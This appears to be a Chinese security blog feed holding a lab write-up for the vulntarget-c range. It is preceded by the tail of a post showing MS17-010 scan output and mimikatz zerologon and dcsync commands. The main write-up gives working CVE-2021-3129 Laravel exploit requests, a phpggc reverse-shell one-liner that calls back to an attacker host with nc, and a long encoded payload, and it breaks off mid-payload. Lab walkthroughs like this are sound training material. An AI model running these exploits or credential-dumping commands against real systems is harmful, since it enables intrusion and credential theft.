â€˜192.168.48.128â€™ is alive<br>(icmp) Target â€˜192.168.48.200â€™ is alive<br>icmp alive hosts len is: 2<br>192.168.48.200:139 open<br>192.168.48.128:139 open<br>192.168.48.128:88 open<br>192.168.48.200:445 open<br>192.168.48.128:445 open<br>192.168.48.200:135 open<br>192.168.48.128:135 open<br>alive ports len is: 7<br>start vulscan<br>[+] 192.168.48.200      MS17-010        (Windows Server 2008 R2 Datacenter 7600)<br>[<em>] 192.168.48.200       WEAK\WIN-S96L5Q5A734   Windows Server 2008 R2 Datacenter 7600<br>NetInfo:<br>[*]192.168.48.128<br>   [-&gt;]WIN-JK2FG246GEF<br>   [-&gt;]192.168.48.128<br>[</em>] 192.168.48.128 [+]DC WEAK\WIN-JK2FG246GEF   Windows Server 2008 R2 Datacenter 7600<br>[+] 192.168.48.128      MS17-010        (Windows Server 2008 R2 Datacenter 7600)<br>å·²å®Œæˆ 9/9<br>scan end</p><p>WIN-JK2FG246GEF$</p><p>kiwi_cmd â€œlsadump::zerologon /target:192.168.48.128 /account:WIN-JK2FG246GEF$â€ exit</p><p>mimikatz.exe â€œlsadump::zerologon /target:192.168.48.128 /account:DC01$â€ exit</p><p>kiwi_cmd â€œlsadump::dcsync /domain:WEAK.COM /dc:WIN-JK2FG246GEF.WEAK.COM /user:administrator /authuser:WIN-JK2FG246GEF$ /authdomain:WEAK /authpassword: /authntlmâ€</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>vulntarget-c</title>
      <link href="/2022/11/29/vulntarget-c/"/>
      <url>/2022/11/29/vulntarget-c/</url>
      
        <content type="html"><![CDATA[<h3 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h3><p>ç›¸å…³æ¼æ´æŠ€æœ¯ï¼šlaravelã€OVAS-PHPç›¸å…³æ¼æ´ã€éš§é“ä»£ç†ã€å…æ€ã€ææƒã€CVE-2021-3129<br>ã€CVE-2021-3493ç­‰<br>ä¸‹è½½åœ°å€ï¼š<br>ç™¾åº¦äº‘é“¾æ¥:<br><a href="https://pan.baidu.com/s/1p3GDd7V3Unmq3-wSAvl7_Q">https://pan.baidu.com/s/1p3GDd7V3Unmq3-wSAvl7_Q</a><br>æå–ç : 1p9p</p><p>å…¶ä¸­vulntarget-cæ˜¯æœ¬æ¬¡ç¯å¢ƒ</p><p>githubåœ°å€ï¼š</p><p><a href="https://github.com/crow821/vulntarget">https://github.com/crow821/vulntarget</a></p><h4 id="æ‹“æ‰‘å›¾"><a href="#æ‹“æ‰‘å›¾" class="headerlink" title="æ‹“æ‰‘å›¾"></a>æ‹“æ‰‘å›¾</h4><p><img src="/images/vulntarget-e/image-20221129102253692.png" alt="image-20221129102253692"></p><h4 id="vmç½‘å¡é…ç½®"><a href="#vmç½‘å¡é…ç½®" class="headerlink" title="vmç½‘å¡é…ç½®"></a>vmç½‘å¡é…ç½®</h4><p>å°†ç™¾åº¦ç½‘ç›˜çš„é¶åœºcä¸‹è½½ä¸‹æ¥ï¼Œä½¿ç”¨vmæ‰“å¼€ï¼Œæˆ‘ä»¬å…ˆç¼–è¾‘ä¸€ä¸‹è™šæ‹Ÿç½‘å¡ç½‘æ®µ</p><p><img src="/images/vulntarget-e/image-20221129102606686.png" alt="image-20221129102606686"></p><p>è¿™é‡Œè¦æ³¨æ„ä¸å‹¾é€‰å°†ä¸»æœºè™šæ‹Ÿè¿æ¥åˆ°æ­¤ç½‘ç»œï¼Œå¦‚æœå‹¾é€‰çš„è¯ï¼Œä½ ä¼šå‘ç°ï¼Œæˆ‘ä»¬ç›´æ¥èƒ½ä»ä¸»æœºpingåˆ°10ï¼Œ20æ®µï¼Œè¿™æ ·å°±ä¸æ˜¯å†…ç½‘äº†ã€‚</p><p>ç¬¬ä¸€å°æ˜¯ubuntu20</p><p><img src="/images/vulntarget-e/image-20221129102818958.png" alt="image-20221129102818958"></p><p>ç¬¬äºŒå°win2016</p><p><img src="/images/vulntarget-e/image-20221129102845711.png" alt="image-20221129102845711"></p><p>ç¬¬ä¸‰å°ubuntu16</p><p><img src="/images/vulntarget-e/image-20221129102914418.png" alt="image-20221129102914418"></p><p>è®¾ç½®å¥½ä¹‹åå¼€æœºï¼Œä½†æ˜¯è¿˜æ˜¯æœ‰ä¸€ç‚¹é—®é¢˜ï¼Œé»˜è®¤ä½œè€…é…ç½®çš„æ—¶å€™ç»™åˆ°çš„æ˜¯é™æ€ip30æ®µçš„ï¼Œæˆ‘ä»¬éœ€è¦æ”¹ä¸€ä¸‹ï¼Œæˆ‘è¿™è¾¹netæ˜¯144æ®µçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬ç»™ç½‘å¡ä¸€ä¸ª144æ®µçš„é™æ€IPå°±å¯ä»¥äº†</p><p><code>è´¦å¯†1ï¼švulntarget/root</code><br><code>è´¦å¯†2ï¼šroot/root#qwe</code></p><p>ç”¨rootè´¦å·ç™»å½•ä¸€ä¸‹ï¼Œæ”¹æ‰ç½‘å¡é…ç½®</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">su</span><br><span class="line">root<span class="comment">#qwe</span></span><br><span class="line">vim /etc/netplan/00-installer-config.yaml <span class="comment">#ç¼–è¾‘ç½‘å¡é…ç½®æ–‡ä»¶</span></span><br><span class="line">:wq</span><br><span class="line">netplan apply <span class="comment">#é‡å¯ç½‘å¡</span></span><br></pre></td></tr></table></figure><p><img src="/images/vulntarget-e/image-20221129103520466.png" alt="image-20221129103520466"></p><p><img src="/images/vulntarget-e/image-20221129103635589.png" alt="image-20221129103635589"></p><p>è¿™é‡Œæ³¨æ„ç½‘å…³ä¹Ÿæ”¹ä¸€ä¸‹ï¼Œå½“ç„¶è¿™é‡Œç½‘å¡ä¸å”¯ä¸€ï¼Œæˆ‘è¿™æ ·åé¢æ¯”è¾ƒç®€å•ä¸éœ€è¦æ”¹ç½‘å¡é…ç½®æ–‡ä»¶äº†</p><p>æˆ‘ä»¬ç®€å•æ‰«ä¸€ä¸‹<img src="/images/vulntarget-e/image-20221129104349743.png" alt="image-20221129104349743"></p><p>å¯ä»¥çœ‹åˆ°55çš„ipå¼€ç€80å’Œ22ï¼Œè®¿é—®ä¸€ä¸‹</p><p><img src="/images/vulntarget-e/image-20221129104507816.png" alt="image-20221129104507816"></p><p>è‡³æ­¤åœ¨vmä¸Šç¯å¢ƒæ­å»ºå·²ç»å®Œæˆ</p><h3 id="laravelæ¸—é€-CVE-2021-3129"><a href="#laravelæ¸—é€-CVE-2021-3129" class="headerlink" title="laravelæ¸—é€-CVE-2021-3129"></a>laravelæ¸—é€-CVE-2021-3129</h3><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æ˜¯ä¸€ä¸ªlaravelçš„æ¡†æ¶ç½‘ç«™ï¼Œæ—¢ç„¶é¶åœºï¼Œé‚£è‚¯å®šå­˜åœ¨æ¼æ´ï¼Œåœ¨å³ä¸‹è§’æˆ‘ä»¬ä¹Ÿå¯ä»¥çœ‹åˆ°Laravel v8.78.1 (PHP v7.4.3)ï¼Œé‚£è‚¯å®šæ˜¯å¤ç°laravelå†å²æ¼æ´äº†ã€‚ç½‘ä¸Šæœä¸€ä¸‹ç‰ˆæœ¬å·ï¼Œ(å¯ä»¥çœ‹åˆ°å…¶ä»–ä½¬å‘çš„è¿™ä¸ªé¶åœºwpï¼Œç¡®å®šCVE-2021-3129),å‘ç°æ˜¯2021-3129ï¼Œåæ­£æˆ‘æ˜¯æ²¡æœ‰å‘ç°ï¼Œå› ä¸ºçœ‹æ–‡ç« éƒ½æ˜¯è¯´å½±å“ç‰ˆæœ¬åœ¨Laravel&lt;=8.4.2,<code>https://www.freebuf.com/vuls/280508.html</code>,ä½†æ˜¯é¶æœºç¯å¢ƒåœ¨8.78ï¼Œä¹Ÿæœ‰å¯èƒ½æ˜¯ï¼Œ<code>Ignitionï¼ˆ&lt;=2.5.1ï¼‰</code>,è¿™ä¸ªæ’ä»¶çš„ç‰ˆæœ¬çš„é—®é¢˜ï¼Œè¿™ä¸ªæ–‡ç« è¯´çš„ï¼Œ<code>https://mp.weixin.qq.com/s/k08P2Uij_4ds35FxE2eh0g</code><br>emmmmå°±å½“å‘ç°äº†å§ã€‚æˆ‘ä»¬å»å¤ç°ä¸€ä¸‹ã€‚</p><p>é¦–å…ˆè‚¯å®šæ˜¯githubæ‰¾å„ç§pocï¼Œæˆ‘ä¹Ÿæ‰¾äº†å„ç§pocï¼Œéƒ½æ‰“äº†ä¸€éï¼Œemmmmï¼Œéƒ½æ²¡æ‰“é€šï¼Œä¸æ˜¯phpæŠ¥é”™å°±æ˜¯not fund rce ï¼Œå¯èƒ½æ˜¯kaliçš„é—®é¢˜ï¼Œæ²¡æœ‰å»å…¶ä»–ç³»ç»Ÿæµ‹è¯•ï¼Œæœ‰å…´è¶£çš„å°ä¼™ä¼´æµ‹è¯•ä¸€ä¸‹ã€‚</p><p><code>http://wiki.peiqi.tech/wiki/frame/Laravel/Laravel%20Debug%E6%A8%A1%E5%BC%8F%20_ignition%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2021-3129.html</code><br><code>https://github.com/SNCKER/CVE-2021-3129</code><br><code>https://github.com/SecPros-Team/laravel-CVE-2021-3129-EXP</code></p><p><img src="/images/vulntarget-e/image-20221129174149286.png" alt="image-20221129174149286"></p><p><img src="/images/vulntarget-e/image-20221129174203408.png" alt="image-20221129174203408"></p><p>è¿™å‡ ä¸ªpocéƒ½è¯•äº†ä¸€ä¸‹ï¼Œæ²¡æœ‰æ‰“é€šï¼Œæ²¡æœ‰å…³ç³»ï¼Œæˆ‘ä»¬æ‰‹å·¥å¤ç°ä¸€ä¸‹ã€‚<br>å‚è€ƒä¸‹é¢è¿™ç¯‡æ–‡ç« </p><p><code>https://www.freebuf.com/vuls/280508.html</code><br>å…·ä½“åŸç†è¿™é‡Œå°±ä¸èµ˜è¿°äº†ï¼Œç›´æ¥æ‰“</p><p>å…ˆè®¿é—®ç½‘ç«™ï¼ŒæŠ“åŒ…ï¼Œç„¶åæˆ‘ä»¬å¯ä»¥çœ‹åˆ°åŒ…é‡Œæœ‰è®¸å¤šå†…å®¹ï¼ŒæŠŠä¸‹é¢çš„åˆ æ‰ï¼Œç„¶ååªç•™å››è¡Œ</p><p><img src="/images/vulntarget-e/image-20221129175857744.png" alt="image-20221129175857744"></p><p><img src="/images/vulntarget-e/image-20221129180059768.png" alt="image-20221129180059768"></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/_ignition/execute-solution</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.144.55</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>168</span><br><span class="line"></span><br><span class="line"><span class="json">&#123;</span></span><br><span class="line"><span class="json">  <span class="attr">&quot;solution&quot;</span>: <span class="string">&quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;</span>,</span></span><br><span class="line"><span class="json">  <span class="attr">&quot;parameters&quot;</span>: &#123;</span></span><br><span class="line"><span class="json">    <span class="attr">&quot;variableName&quot;</span>: <span class="string">&quot;username&quot;</span>,</span></span><br><span class="line"><span class="json">    <span class="attr">&quot;viewFile&quot;</span>: <span class="string">&quot;xxxxxxx&quot;</span></span></span><br><span class="line"><span class="json">  &#125;</span></span><br><span class="line"><span class="json">&#125;</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°èƒ½å¤Ÿæ‰§è¡Œï¼Œ</p><p>ä¸‹è½½GitHubä¸Šä¸‹è½½çš„dockerç¯å¢ƒä¸­å¸¦æœ‰expï¼Œä½¿ç”¨æ­¤expéœ€è¦ä¸‹è½½phpggc</p><p><code>git clone https://github.com/ambionics/phpggc.git</code></p><p>æ”¹ä¸€ä¸‹777çš„æƒé™ï¼Œä¸‹é¢ç”Ÿæˆpocçš„æ—¶å€™ä¼šç”¨åˆ°</p><p>è¿™é‡Œæˆ‘ä»¬ç”Ÿæˆpocã€‚è¦åˆ°åˆšåˆšphpggcç›®å½•ä¸‹ï¼Œä¸Šé¢é‚£ç¯‡æ–‡ç« ä¸­å·²ç»æœ‰phpinfoäº†ï¼Œè·Ÿç€å¤ç°å°±è¡Œäº†ï¼Œäº²æµ‹phpinfoæ²¡æœ‰é—®é¢˜ã€‚å› ä¸ºæˆ‘ä¸Šé¢expè„šæœ¬éƒ½ä¸èƒ½ç”¨ï¼Œæ‰€ä»¥æƒ³ç€æœä¸€ä¸ªæ‰‹å·¥å¤ç°çš„æ‰“webshellçš„æ–¹æ³•ï¼Œå¥ˆä½•ç½‘ä¸Šçš„æ–¹æ³•éƒ½åªåˆ°phpinfoå°±ç»“æŸäº†ï¼Œå¹¶æ²¡æœ‰ç”Ÿæˆwebshellçš„ï¼Œå› ä¸ºè¿™é‡Œé¢æˆ‘ä»¬æ‰“ä¸€éphpinfoä¹‹åï¼Œæ—¥å¿—æ–‡ä»¶ä¼šé‡æ–°ç”Ÿæˆï¼ŒğŸå¹¶ä¸ä¼šç•™ç€æ—¥å¿—é‡Œï¼Œæ‰€ä»¥æˆ‘ä»¬è¦æœ‰ä¸€ä¸ªåå¼¹shellçš„æ–¹æ³•ï¼Œæˆ–è€…ç”Ÿæˆwebshellï¼Œç»è¿‡æµ‹è¯•ï¼Œå¤ªèœäº†ï¼Œfileputcontentæ²¡æœ‰æˆåŠŸï¼Œechoä¹Ÿæ²¡æœ‰æˆåŠŸï¼Œä½†æ˜¯æ²¡ç»™pocï¼Œæˆ‘ä»¬è‡ªå·±æ‰“ä¸€ä¸‹</p><p>è¿™é‡Œæ˜¯åå¼¹shellçš„ï¼Œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php7.4 -d <span class="string">&quot;phar.readonly=0&quot;</span> ./phpggc Laravel/RCE5 <span class="string">&quot;system(&#x27;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.144.128 9999 &gt;/tmp/f&#x27;);phpinfo();&quot;</span> --phar phar -o php://output | base64 -w 0 | python -c <span class="string">&quot;import sys;print(&#x27;&#x27;.join([&#x27;=&#x27; + hex(ord(i))[2:] + &#x27;=00&#x27; for i in sys.stdin.read()]).upper())&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/images/vulntarget-e/image-20221129182228006.png" alt="image-20221129182228006"></p><p>ç”Ÿæˆä¸€ä¸²ç ï¼Œ</p><p>ä¸Šé¢å·²ç»è¯æ˜æ¼æ´å­˜åœ¨</p><p>ç„¶åbpå‘åŒ…ï¼Œæ¸…ç©ºæ—¥å¿—</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/_ignition/execute-solution</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.144.55</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>328</span><br><span class="line"></span><br><span class="line"><span class="json">&#123;</span></span><br><span class="line"><span class="json">  <span class="attr">&quot;solution&quot;</span>: <span class="string">&quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;</span>,</span></span><br><span class="line"><span class="json">  <span class="attr">&quot;parameters&quot;</span>: &#123;</span></span><br><span class="line"><span class="json">    <span class="attr">&quot;variableName&quot;</span>: <span class="string">&quot;username&quot;</span>,</span></span><br><span class="line"><span class="json">    <span class="attr">&quot;viewFile&quot;</span>: <span class="string">&quot;php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log&quot;</span></span></span><br><span class="line"><span class="json">  &#125;</span></span><br><span class="line"><span class="json">&#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line"></span><br><span class="line">![image-20221129201015519](/images/vulntarget-e/image-20221129201015519.png)</span><br><span class="line"></span><br><span class="line">å‘é€å¦‚ä¸‹æ•°æ®åŒ…ï¼Œç»™Logå¢åŠ ä¸€æ¬¡å‰ç¼€ï¼Œç”¨äºå¯¹é½ï¼š</span><br><span class="line"></span><br><span class="line">```http</span><br><span class="line">POST /_ignition/execute-solution HTTP/1.1</span><br><span class="line">Host: 192.168.144.55</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 163</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,</span><br><span class="line">  &quot;parameters&quot;: &#123;</span><br><span class="line">    &quot;variableName&quot;: &quot;username&quot;,</span><br><span class="line">    &quot;viewFile&quot;: &quot;AA&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/vulntarget-e/image-20221129201219036.png" alt="image-20221129201219036"></p><p>å°†POCä½œä¸ºviewFileçš„å€¼ï¼Œå‘é€æ•°æ®åŒ…ï¼Œè¿™é‡Œæœ€åæœ‰ä¸ªaåˆ«å¿˜äº†ã€‚</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/_ignition/execute-solution</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.144.55</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>5514</span><br><span class="line"></span><br><span class="line"><span class="dns">&#123;</span></span><br><span class="line"><span class="dns">  &quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,</span></span><br><span class="line"><span class="dns">  &quot;parameters&quot;: &#123;</span></span><br><span class="line"><span class="dns">    &quot;variableName&quot;: &quot;username&quot;,</span></span><br><span class="line"><span class="dns">    &quot;viewFile&quot;: &quot;=<span class="number">50=00=44=00</span>=<span class="number">39=00=77=00</span>=<span class="number">61=00=48=00</span>=<span class="number">41=00=67=00</span>=<span class="number">58=00=31=00</span>=<span class="number">39=00=49=00</span>=<span class="number">51=00=55=00</span>=<span class="number">78=00=55=00</span>=<span class="number">58=00=30=00</span>=<span class="number">4</span>E=<span class="number">00=50=00=54</span>=<span class="number">00=56=00=42</span>=<span class="number">00</span>=<span class="number">4</span><span class="keyword">A</span>=<span class="number">00=54=00=45</span>=<span class="number">00=56=00=53</span>=<span class="number">00</span>=<span class="number">4</span>B=<span class="number">00</span>=<span class="number">43</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00=37=00=49</span>=<span class="number">00=44=00=38</span>=<span class="number">00</span>=<span class="number">2</span>B=<span class="number">00=44=00=51</span>=<span class="number">00=70=00=63</span>=<span class="number">00=41=00=67</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=51</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=42</span>=<span class="number">00=45=00=41</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=42</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=41</span>=<span class="number">00</span>=<span class="number">41</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00=41=00=67</span>=<span class="number">00=41=00=41</span>=<span class="number">00</span>=<span class="number">54</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">30</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">44</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00=69=00=53</span>=<span class="number">00=57=00=78</span>=<span class="number">00=73=00=64</span>=<span class="number">00=57=00=31</span>=<span class="number">00=70=00=62</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00=46=00=30</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=56=00=78</span>=<span class="number">00=43=00=63</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00=39=00=68</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">47</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00=68=00=63</span>=<span class="number">00=33=00=52</span>=<span class="number">00=70=00=62</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00=64=00=63</span>=<span class="number">00=55=00=47</span>=<span class="number">00=56=00=75</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">47</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00</span>=<span class="number">75</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">30</span>=<span class="number">00</span>=<span class="number">4</span><span class="keyword">A</span>=<span class="number">00=79=00=62</span>=<span class="number">00=32=00=46</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00=59=00=32</span>=<span class="number">00</span>=<span class="number">46</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00=64=00=43</span>=<span class="number">00=49=00=36</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=70=00=37</span>=<span class="number">00</span>=<span class="number">63</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">35</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00=69=00=49</span>=<span class="number">00</span>=<span class="number">41</span>=<span class="number">00</span>=<span class="number">4</span>B=<span class="number">00=67=00=42</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00</span>=<span class="number">64</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00=56=00=75</span>=<span class="number">00=64=00=48</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">69</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00=30=00=38</span>=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=55=00=36</span>=<span class="number">00</span>=<span class="number">49</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00=73=00=62</span>=<span class="number">00=48=00=56</span>=<span class="number">00=74=00=61</span>=<span class="number">00=57=00=35</span>=<span class="number">00=68=00=64</span>=<span class="number">00=47=00=56</span>=<span class="number">00=63=00=51</span>=<span class="number">00</span>=<span class="number">6</span>E=<span class="number">00</span>=<span class="number">56</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00=58=00=45</span>=<span class="number">00=52=00=70</span>=<span class="number">00=63=00=33</span>=<span class="number">00=42=00=68</span>=<span class="number">00=64=00=47</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=58=00=49</span>=<span class="number">00</span>=<span class="number">69</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=45=00=36</span>=<span class="number">00=65=00=33</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00=54=00=59</span>=<span class="number">00=36=00=49</span>=<span class="number">00=67=00=41</span>=<span class="number">00=71=00=41</span>=<span class="number">00=48=00=46</span>=<span class="number">00</span>=<span class="number">31</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=58=00=56</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00</span>=<span class="number">55</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00</span>=<span class="number">56</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00=62=00=32</span>=<span class="number">00=78=00=32</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=58=00=49</span>=<span class="number">00</span>=<span class="number">69</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00=32=00=45</span>=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=70=00=37</span>=<span class="number">00=61=00=54</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">77</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00=30=00=38</span>=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=55=00=36</span>=<span class="number">00</span>=<span class="number">49</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00=31=00=76</span>=<span class="number">00=59=00=32</span>=<span class="number">00</span>=<span class="number">74</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00</span>=<span class="number">63</span>=<span class="number">00</span>=<span class="number">6</span>E=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00=63=00=54</span>=<span class="number">00=47=00=39</span>=<span class="number">00</span>=<span class="number">68</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=47=00=56</span>=<span class="number">00=79=00=58</span>=<span class="number">00=45=00=56</span>=<span class="number">00=32=00=59</span>=<span class="number">00=57=00=78</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00=62=00=32</span>=<span class="number">00</span>=<span class="number">46</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=58=00=49</span>=<span class="number">00</span>=<span class="number">69</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=41=00=36</span>=<span class="number">00=65=00=33</span>=<span class="number">00=31=00=70</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=45=00=37</span>=<span class="number">00</span>=<span class="number">63</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">30</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">69</span>=<span class="number">00</span>=<span class="number">4</span><span class="keyword">A</span>=<span class="number">00=73=00=62</span>=<span class="number">00=32=00=46</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00</span>=<span class="number">49</span>=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=74=00=39</span>=<span class="number">00=66=00=58</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">44</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00=69=00=41</span>=<span class="number">00</span>=<span class="number">43</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">41</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">58</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00</span>=<span class="number">62</span>=<span class="number">00</span>=<span class="number">6</span>E=<span class="number">00=51=00=69</span>=<span 